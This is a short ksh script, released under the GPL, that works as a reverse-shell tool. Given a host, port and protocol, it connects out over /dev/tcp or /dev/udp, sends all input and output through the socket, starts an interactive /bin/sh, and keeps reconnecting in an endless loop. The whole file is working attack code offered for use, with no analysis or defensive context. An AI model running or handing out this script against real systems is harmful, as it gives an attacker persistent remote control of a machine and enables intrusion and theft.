#!/usr/bin/ksh

# Copyright 2024 Elijah Gordon (NitrixXero) <nitrixxero@gmail.com>

# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

if [ $# -ne 3 ]; then
    echo "Usage: $0 <hostname> <port> <protocol>"
    exit 1
fi

HOST=$1
PORT=$2
PROTOCOL=$3

while true; do
    case $PROTOCOL in
        "tcp")
            exec 3<>/dev/tcp/$HOST/$PORT
            ;;
        "udp")
            exec 3<>/dev/udp/$HOST/$PORT
            ;;
        *)
            echo "Unsupported protocol. Please use 'tcp' or 'udp'."
            exit 1
            ;;
    esac
    if [ $? -eq 0 ]; then
        echo "Reverse shell connected over $PROTOCOL"
        
        exec 0<&3
        exec 1>&3
        exec 2>&3
        
        /bin/sh -i
        
        exec 3<&-
        exec 3>&-
        sleep 1
    else
        echo "Failed to connect. Retrying..."
        sleep 1
    fi
done
